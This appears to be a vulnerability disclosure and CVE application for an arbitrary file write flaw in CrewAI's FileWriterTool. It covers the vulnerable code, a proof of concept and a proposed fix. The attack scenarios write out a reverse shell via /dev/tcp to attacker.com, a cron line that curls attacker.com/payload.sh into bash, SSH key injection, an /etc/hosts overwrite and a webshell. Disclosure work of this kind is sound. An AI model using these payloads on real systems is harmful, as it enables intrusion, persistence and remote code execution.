# CVE Application: CrewAI FileWriterTool Arbitrary File Write Vulnerability

## Vulnerability Summary

**Product**: CrewAI (crewai-tools)
**Affected Version**: <= 1.0.0a2
**Vulnerability Type**: Path Traversal (CWE-22) / Unrestricted File Upload
**CVSS v3.1 Score**: 8.1 (High)
**CVSS Vector**: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H

## Description

The FileWriterTool in crewai-tools allows arbitrary file writes to any location on the filesystem. The `_run()` method directly concatenates user-supplied `directory` and `filename` parameters without validation, and even creates directories if they don't exist. This allows attackers to:
1. Write files to arbitrary system locations
2. Overwrite critical system files
3. Create malicious files in startup directories
4. Plant backdoors or webshells

## Affected Component

**File**: `crewai-tools/src/crewai_tools/tools/file_writer_tool/file_writer_tool.py`

**Vulnerable Code** (lines 27-48):
```python
def _run(self, **kwargs: Any) -> str:
    try:
        # VULNERABILITY: Creates directory without validation
        if kwargs.get("directory") and not os.path.exists(kwargs["directory"]):
            os.makedirs(kwargs["directory"])  # Can create arbitrary directories

        # VULNERABILITY: Direct path concatenation without validation
        filepath = os.path.join(kwargs.get("directory") or "", kwargs["filename"])

        # Convert overwrite to boolean
        kwargs["overwrite"] = strtobool(kwargs["overwrite"])

        # Check if file exists
        if os.path.exists(filepath) and not kwargs["overwrite"]:
            return f"File {filepath} already exists and overwrite option was not passed."

        # VULNERABILITY: Write to arbitrary location
        mode = "w" if kwargs["overwrite"] else "x"
        with open(filepath, mode) as file:
            file.write(kwargs["content"])
        return f"Content successfully written to {filepath}"
    except FileExistsError:
        return (
            f"File {filepath} already exists and overwrite option was not passed."
        )
    except KeyError as e:
        return f"An error occurred while accessing key: {e!s}"
    except Exception as e:
        return f"An error occurred while writing to the file: {e!s}"
```

## Proof of Concept

```python
#!/usr/bin/env python3
import sys
import os
sys.path.insert(0, '/path/to/crewai-tools/src')

from crewai_tools.tools.file_writer_tool.file_writer_tool import FileWriterTool

tool = FileWriterTool()

# Attack 1: Write to /tmp directory
result = tool.run(
    filename='malicious.txt',
    directory='/tmp',
    content='MALICIOUS_CONTENT',
    overwrite=True
)
print(result)  # "Content successfully written to /tmp/malicious.txt"

# Verify
assert os.path.exists('/tmp/malicious.txt')

# Attack 2: Write to user home directory
home = os.path.expanduser('~')
result = tool.run(
    filename='test.txt',
    directory=home,
    content='HOME_DIRECTORY_WRITE',
    overwrite=True
)
print(result)  # Success

# Attack 3: Write SSH authorized key (if permissions allow)
# ssh_key = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC..."
# tool.run(
#     filename='authorized_keys',
#     directory=os.path.expanduser('~/.ssh'),
#     content=ssh_key,
#     overwrite=True
# )

# Attack 4: Write cron job backdoor
# cron_content = "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'"
# tool.run(
#     filename='backdoor.cron',
#     directory='/etc/cron.d',
#     content=cron_content,
#     overwrite=True
# )

# Attack 5: Write to new directory (tool creates it!)
# tool.run(
#     filename='test.txt',
#     directory='/tmp/new_dir_that_will_be_created',
#     content='Directory created automatically!',
#     overwrite=True
# )
```

## Impact

An attacker can:
1. **Write arbitrary files** - Create files anywhere on the filesystem
2. **Overwrite system files** - Modify configuration files, hosts files, etc.
3. **Create persistence mechanisms** - Plant cron jobs, startup scripts, etc.
4. **Inject malicious code** - Write to web directories, script directories
5. **Plant backdoors** - Write SSH keys, authorized_keys files
6. **Create malicious pickle files** - For use with PickleHandler vulnerability (RCE chain)

## Attack Chain Example

```
FileWriterTool (Arbitrary File Write)
    ↓
Write malicious pickle file to /tmp/
    ↓
PickleHandler (Path Traversal + Deserialization)
    ↓
Load malicious pickle via path traversal
    ↓
RCE!
```

## CVSS v3.1 Score Breakdown

**Base Score**: 8.1 (High)

| Metric | Value | Description |
|--------|-------|-------------|
| Attack Vector (AV) | Network | Exploitable over network |
| Attack Complexity (AC) | Low | No special conditions required |
| Privileges Required (PR) | None | No authentication required |
| User Interaction (UI) | None | No user interaction required |
| Scope (S) | Unchanged | Vulnerability within component scope |
| Confidentiality (C) | None | Does not directly expose data (but enables other attacks) |
| Integrity (I) | High | Can modify any file on system |
| Availability (A) | High | Can disrupt system availability |

## Attack Scenarios

### Scenario 1: SSH Key Injection
```python
tool = FileWriterTool()

# Attacker injects their SSH public key
ssh_key = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC..."
tool.run(
    filename='authorized_keys',
    directory=os.path.expanduser('~/.ssh'),
    content=ssh_key,
    overwrite=True
)
# Result: Attacker can now SSH into the system without password
```

### Scenario 2: Cron Backdoor
```python
tool = FileWriterTool()

# Write persistent backdoor
backdoor = "* * * * * /bin/bash -c 'curl http://attacker.com/payload.sh | bash'"
tool.run(
    filename='crewai_backdoor',
    directory='/etc/cron.d',
    content=backdoor,
    overwrite=True
)
# Result: Backdoor executes every minute as root
```

### Scenario 3: DNS Poisoning
```python
tool = FileWriterTool()

# Poison /etc/hosts
hosts_content = "127.0.0.1 localhost\n192.168.1.100 evil.com"
tool.run(
    filename='hosts',
    directory='/etc',
    content=hosts_content,
    overwrite=True
)
# Result: DNS redirection for malicious purposes
```

### Scenario 4: Webshell
```python
tool = FileWriterTool()

# Write Python webshell to web directory
webshell = "import os\nos.system(request.args.get('cmd', ''))"
tool.run(
    filename='shell.py',
    directory='/var/www/html/uploads',
    content=webshell,
    overwrite=True
)
# Result: Remote code execution via web
```

## Remediation

### Recommended Fix

```python
import os
import re
from pathlib import Path
from typing import Any

class FileWriterTool(BaseTool):
    # Restrict writes to specific directories
    allowed_base_dirs: list[str] = Field(
        default_factory=lambda: [os.path.join(os.getcwd(), "output")]
    )

    # Only allow safe filename patterns
    allowed_filename_pattern: str = r'^[a-zA-Z0-9._-]+$'

    # Maximum file size (10MB)
    max_file_size: int = 10_000_000

    def _validate_directory(self, directory: str) -> str:
        """Validate directory is within allowed base directories."""
        dir_path = Path(directory).resolve()

        for allowed_dir in self.allowed_base_dirs:
            allowed_path = Path(allowed_dir).resolve()
            try:
                dir_path.relative_to(allowed_path)
                return str(dir_path)
            except ValueError:
                continue

        raise ValueError(
            f"Access denied: directory '{directory}' is outside allowed directories"
        )

    def _validate_filename(self, filename: str) -> str:
        """Validate filename is safe."""
        # Check for path traversal
        if '..' in filename or filename.startswith('/'):
            raise ValueError("Path traversal detected in filename")

        # Check filename pattern
        if not re.match(self.allowed_filename_pattern, filename):
            raise ValueError(f"Invalid filename: {filename}")

        # Check file extension
        allowed_extensions = ['.txt', '.md', '.json', '.csv', '.log', '.html']
        file_ext = Path(filename).suffix.lower()
        if file_ext and file_ext not in allowed_extensions:
            raise ValueError(f"File extension '{file_ext}' not allowed")

        return filename

    def _validate_content(self, content: str) -> str:
        """Validate file content."""
        if len(content) > self.max_file_size:
            raise ValueError(f"Content too large (max {self.max_file_size} bytes)")

        # Check for dangerous patterns
        dangerous_patterns = [
            '<script', '<?php', '<%', '#!/bin/',
        ]
        content_lower = content.lower()
        for pattern in dangerous_patterns:
            if pattern in content_lower:
                raise ValueError(f"Content contains potentially dangerous pattern: {pattern}")

        return content

    def _run(self, **kwargs: Any) -> str:
        try:
            filename = kwargs.get("filename")
            directory = kwargs.get("directory", "./")
            content = kwargs.get("content", "")
            overwrite = strtobool(kwargs.get("overwrite", False))

            # VALIDATION
            validated_dir = self._validate_directory(directory)
            validated_filename = self._validate_filename(filename)
            validated_content = self._validate_content(content)

            # Construct safe path
            filepath = os.path.join(validated_dir, validated_filename)

            # Double-check final path is still within allowed directories
            final_path = Path(filepath).resolve()
            allowed = False
            for allowed_dir in self.allowed_base_dirs:
                try:
                    final_path.relative_to(Path(allowed_dir).resolve())
                    allowed = True
                    break
                except ValueError:
                    continue

            if not allowed:
                raise ValueError("Final path validation failed")

            # Create directory if needed
            os.makedirs(validated_dir, exist_ok=True)

            # Check overwrite
            if os.path.exists(filepath) and not overwrite:
                return f"Error: File already exists and overwrite=False"

            # Write file
            mode = "w" if overwrite else "x"
            with open(filepath, mode) as file:
                file.write(validated_content)

            return f"Content successfully written to {filepath}"

        except ValueError as e:
            return f"Error: {e}"
        except Exception as e:
            return f"Error: Failed to write file"
```

### Alternative Security Measures

1. **Content-type validation** - Only allow text content, reject binary
2. **File size limits** - Prevent disk space exhaustion
3. **Rate limiting** - Limit number of writes per time period
4. **Audit logging** - Log all file write operations
5. **Virus scanning** - Scan written files for malware
6. **Digital signatures** - Verify file authenticity before using

## Timeline

- **2025-01-16**: Vulnerability discovered during security audit
- **2025-01-16**: Vulnerability confirmed with proof-of-concept
- **2025-01-16**: Tested on /tmp, user home, etc.
- **2025-01-16**: Vendor notification pending

## References

- [CWE-22: Improper Limitation of a Pathname to a Restricted Directory](https://cwe.mitre.org/data/definitions/22.html)
- [CWE-73: External Control of File Name or Path](https://cwe.mitre.org/data/definitions/73.html)
- [OWASP Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
- [CrewAI GitHub Repository](https://github.com/crewAIInc/crewAI)

## Credit

Discovered by: Security Researcher
Contact: [Responsible Disclosure]

## Disclaimer

This vulnerability report is provided for security research and educational purposes only. All testing was conducted in an authorized environment. Please do not use this information for unauthorized testing or malicious attacks.

---

**Report Generated**: 2025-01-16
**Status**: Pending CVE Assignment
